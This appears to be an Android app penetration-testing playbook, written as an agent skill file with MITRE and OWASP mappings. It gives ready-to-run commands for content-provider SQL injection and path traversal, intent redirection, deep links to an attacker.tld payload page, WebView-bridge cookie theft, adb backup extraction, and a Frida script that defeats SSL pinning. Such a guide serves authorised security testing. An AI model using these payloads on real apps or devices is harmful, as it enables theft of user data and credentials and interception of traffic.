# Android Application Penetration Testing — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application), T1204 (User Execution: Malicious File), T1634 (Data from Mobile Device), T1636 (Credentials from Mobile Device), T1573 (Encrypted Channel)
**OWASP Mapping:** MASVS-DATA-STORAGE, MASVS-CRYPTO, MASVS-AUTH, MASVS-NETWORK, MASVS-PLATFORM, MASVS-RESILIENCE
**Severity:** Critical / High / Medium
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: android-pentest-v2
category: android
author: HiveBreach
mitre_attack_id: [T1190, T1204, T1634, T1636, T1573]
owasp_mapping: [MASVS-DATA-STORAGE, MASVS-CRYPTO, MASVS-AUTH, MASVS-NETWORK, MASVS-PLATFORM, MASVS-RESILIENCE]
tags: [android, apk, apktool, jadx, smali, frida, objection, apkleaks, mobsf, intent, content-provider, webview, deep-link, ssl-pinning, adb]
tools: [adb, apktool, jadx, apksigner, frida, objection, apkleaks, mobsf, drozer]
environments: [android]
verification_required: sandbox
```

---

## 1. Detection

### 1.1 APK Anatomy

```
app.apk
  META-INF/            # v1 JAR signature (CERT.RSA, CERT.SF, MANIFEST.MF)
  AndroidManifest.xml  # permissions, components, intents, deep links
  classes.dex          # DEX bytecode (multidex: classes2.dex ... N)
  resources.arsc       # compiled resource table
  res/                 # layouts, drawables, values (strings.xml)
  assets/              # raw files, JS bundles, encrypted configs
  lib/<abi>/*.so       # native libs (arm64-v8a, armeabi-v7a, x86_64)
```

### 1.2 Entry Point Enumeration

```bash
adb shell pm list packages | grep -i target
adb shell pm path com.target.app
adb pull /data/app/com.target.app-*/base.apk target.apk
aapt2 dump badging target.apk
apktool d target.apk -o apk_out/ -f
cat apk_out/AndroidManifest.xml
aapt2 dump xmltree target.apk AndroidManifest.xml | grep -iE "exported|debuggable|allowBackup|usesCleartextTraffic|permission"
```

### 1.3 Attack Surface Flags

| Manifest Flag | Finding |
|---|---|
| `android:exported="true"` | Externally reachable component |
| `android:debuggable="true"` | Debugger attach / data extraction |
| `android:allowBackup="true"` | `adb backup` full exfiltration |
| `android:usesCleartextTraffic="true"` | Plaintext HTTP allowed |
| `<provider>` grantUriPermissions | URI-grant abuse |
| BROWSABLE intent-filter | Deep-link hijack surface |

---

## 2. Confirmation

### 2.1 Source Decompilation

```bash
jadx -d jadx_out/ target.apk --deobf --show-bad-code --threads-count 4
d2j-dex2jar target.apk -o target.jar

grep -rniE "(api[_-]?key|secret|password|access[_-]?token|BEGIN.*PRIVATE KEY)" jadx_out/
grep -rniE "addJavascriptInterface|setAllowFileAccess|DexClassLoader|Runtime\.exec" jadx_out/
grep -rniE "getStringExtra|getIntExtra|getParcelableExtra|Intent\.parseUri" apk_out/smali/
```

### 2.2 Signature Verification

```bash
apksigner verify --verbose target.apk
apkleaks -f target.apk -o secrets.txt
```

---

## 3. Exploitation

### 3.1 Smali Patching

```bash
apktool d target.apk -o patch/ -f
# flip a boolean check: const/4 v0, 0x0 -> const/4 v0, 0x1
apktool b patch/ -o patched.apk
keytool -genkey -v -keystore test.keystore -alias test -keyalg RSA -keysize 2048 -validity 10000
apksigner sign --ks test.keystore --out patched-signed.apk patched.apk
apksigner verify --verbose patched-signed.apk
adb install patched-signed.apk
```

### 3.2 Signature Verification Bypass

- v1-only apps: drop `META-INF/*.SF|.RSA|.MF`, re-sign, reinstall.
- Patch the `PackageManager.getPackageInfo(...).signatures` comparison (see 3.1) or Frida-hook to return the original signature.

### 3.3 Exported Component Abuse (adb shell am)

```bash
adb shell am start -n com.target.app/.AdminActivity
adb shell am start -n com.target.app/.ProfileActivity --es user_id 1337 --ez debug true
```

### 3.4 Intent Injection / Redirection

```bash
adb shell am start -n com.target.app/.ProxyActivity \
  --es redirect_intent 'intent:#Intent;component=com.target.app/.SensitiveActivity;S.extra=1;end'
adb shell am startservice -n com.target.app/.ExportedService \
  --es redirect_intent 'intent:#Intent;component=com.target.app/.PrivService;action=com.target.DO;end'
# Intent.parseUri(..., URI_ALLOW_UNSAFE) + provider grant flags (0x43)
adb shell am start -n com.victim/.SdkProxyActivity \
  --es payload '{"n_intent_uri":"intent:#Intent;data=content://com.victim.fileprovider/root/secret.xml;launchFlags=0x43;end"}'
```

### 3.5 Content Provider Exploitation

```bash
adb shell cmd content query --uri content://com.target.app.provider/users
adb shell cmd content query --uri content://com.target.app.provider/users --projection "1) UNION SELECT username,password--"
adb shell cmd content query --uri content://com.target.app.provider/users --where "1=1) OR 1=1--"
adb shell cmd content read --uri content://com.target.app.provider/../../etc/passwd
adb shell cmd content read --uri content://com.target.app.fileprovider/root/../databases/app.db
```

# drozer: console connect; run app.package.attacksurface com.target.app; run scanner.provider.injection -a com.target.app
```

### 3.6 Deep Link Hijacking

```bash
adb shell am start -a android.intent.action.VIEW \
  -d "myscheme://com.target.app/web?url=https://attacker.tld/payload.html"
adb shell am start -n com.victim/.ExportedWebViewActivity --es data '<img src=x onerror=alert(1)>'
adb shell am start -a android.intent.action.VIEW \
  -d "intent:#Intent;package=com.target.app;scheme=myscheme;S.url=https://attacker.tld;end"
```

### 3.7 WebView JavaScript Bridge

```bash
# After XSS or deep-link-to-WebView:
# <script>for (k in window) try { if (typeof window[k]==='function') console.log(k) } catch(e){}</script>
# Arbitrary file read via bridge handler (bypasses setAllowFileAccess(false)):
# xbridge.invokeMethod(JSON.stringify({handlerName:'toBase64', callbackId:'cb_1',
#   data:{uri:'file:///data/data/<pkg>/app_webview/Default/Cookies'}}))

Hunt: grep -rniE "addJavascriptInterface|@JavascriptInterface|invokeMethod" jadx_out/
```

### 3.8 ADB Backups

```bash
adb backup -f backup.ab com.target.app           # allowBackup=true
(printf "\x1f\x8b\x08\x00\x00\x00\x00\x00" ; dd if=backup.ab bs=1 skip=24) | tar xvzf -
```

### 3.9 SSL Pinning Bypass

```bash
frida -U -f com.target.app --codeshare pcipolloni/universal-android-ssl-pinning-bypass --no-pause
objection --gadget com.target.app explore --startup-command "android sslpinning disable"
apk-mitm target.apk           # static removal
```

```javascript
Java.perform(function() {
  var X509TrustManager = Java.use('javax.net.ssl.X509TrustManager');
  var SSLContext = Java.use('javax.net.ssl.SSLContext');
  var TrustAll = Java.registerClass({
    name: 'com.ht.TrustAll', implements: [X509TrustManager],
    methods: { checkClientTrusted: function() {}, checkServerTrusted: function() {},
               getAcceptedIssuers: function() { return []; } }
  });
  var init = SSLContext.init.overload('[Ljavax.net.ssl.KeyManager;', '[Ljavax.net.ssl.TrustManager;', 'java.security.SecureRandom');
  init.implementation = function(km, tm, sr) {
    return init.call(this, km, Java.array('javax.net.ssl.TrustManager', [TrustAll.$new()]), sr);
  };
  try { Java.use('okhttp3.CertificatePinner').check.implementation = function() {}; } catch (e) {}
});
```

### 3.10 Frida Root/Device Bypass

```bash
frida -U -f com.target.app -l root-bypass.js
frida-trace -U -f com.target.app -i open -i read -i write -i connect -i execve
```

---

## 4. Tool-Specific Guidance

| Tool | Purpose | Key Commands |
|---|---|---|
| adb | Device interaction | `am`/`cmd content`, `pull/push`, `backup` |
| apktool | Decode/rebuild | `apktool d -f app.apk -o dir/` / `apktool b dir/ -o app.apk` |
| jadx | Source decompile | `jadx -d out/ app.apk --deobf` |
| apksigner | Verify/sign | `verify --verbose` / `sign --ks key.keystore` |
| frida | Runtime hooking | `frida -U -f pkg -l s.js --no-pause` |
| objection | Exploration REPL | `objection --gadget pkg explore` |
| drozer | IPC testing | `run app.package.attacksurface pkg` |

---

## 5. PoC Generation

```markdown
## Android Finding — [FINDING_ID]

**Package:** com.target.app 3.2.1 (build 47)
**Component:** content://com.target.app.provider/users
**Severity:** Critical
**MASVS:** MASVS-PLATFORM (IPC), MASVS-DATA-STORAGE

### Evidence
adb shell cmd content query --uri content://com.target.app.provider/users \
  --projection "password" --where "id=1"
[Output showing returned user rows + PII]

### Remediation
- Remove export or require signature-level permission on provider
- Parameterized queries; no raw projection concatenation
- No persistable URI grants
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Tested on emulator (AVD) or dedicated rooted test device
- [ ] Drozer/adb replay confirmed exploitability from third-party context
- [ ] Provider SQLi reproduced against seeded test database
- [ ] Smali patch rebuilt and apksigner-verified before install
- [ ] SSL pinning bypass confirmed by Burp interception
- [ ] No production data touched; findings reproducible on demand

### Prohibited Actions
- Installing patched apps on production/user devices
- Accessing real user data via provider SQLi
- Backups/extraction against non-authorized apps

---

## 7. CheatSheet

```bash
apktool d app.apk -o a/ && grep -iE "exported=\"true\"|action|scheme|authorities" a/AndroidManifest.xml
run app.package.attacksurface com.target.app
adb shell am start -n com.target/.Act --ei id 1 --esn note --eu uri content://x
adb shell cmd content query --uri content://com.target.provider/t
objection --gadget com.target.app explore \
  --startup-command "android sslpinning disable" \
  --startup-command "android root disable"
```

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Mobile API / backend access |
| T1204 | User Execution: Malicious File | Socially installed APK |
| T1406 | Obfuscated Files or Information | Packed/multidex payloads |
| T1414 | Custom Command and Control Protocol | Malicious app C2 |
| T1634 | Data from Mobile Device | Storage extraction |
| T1636 | Credentials from Mobile Device | Token/credential theft |
| T1573 | Encrypted Channel | TLS/pinning posture |

---

## 9. References

- HackTricks Android Pentesting: https://book.hacktricks.xyz/mobile-pentesting/android-app-pentesting
- OWASP MASTG Android: https://mas.owasp.org/MASTG/android/
- apktool: https://github.com/iBotPeaches/Apktool
- jadx: https://github.com/skylot/jadx
- Frida Android: https://frida.re/docs/android/
- Objection: https://github.com/sensepost/objection
- APKLeaks: https://github.com/dwisiswant0/apkleaks
- MobSF: https://github.com/MobSF/Mobile-Security-Framework-MobSF
- Drozer: https://github.com/WithSecureLabs/drozer
- MITRE ATT&CK Mobile Matrix: https://attack.mitre.org/matrices/enterprise/mobile/

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
